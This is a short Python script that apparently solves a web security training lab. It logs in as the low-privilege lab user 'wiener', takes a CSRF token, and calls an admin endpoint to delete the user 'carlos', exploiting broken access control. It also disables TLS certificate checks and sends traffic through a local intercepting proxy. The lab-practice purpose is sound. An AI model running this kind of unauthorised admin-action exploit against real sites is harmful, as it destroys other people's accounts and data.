import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf


def delete_carlos(s, url):
    #Retrieve csrf token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #Login as user
    print("[+] Logging in as the user...")
    data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token}

    r = s.post(login_url, data=data_login, allow_redirects=False, verify=False, proxies=proxies)

    #Delete carlos user
    delete_url = url + "/admin/delete?username=carlos"
    r = s.get(delete_url, verify=False, proxies=proxies)
    res = r.text
    if "Congratulations" in res:
        print("[+] Successfully deleted carlos user!")
    else:
        print("[-] Could not delete carlos user.")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    delete_carlos(s, url)

if __name__ == "__main__":
    main()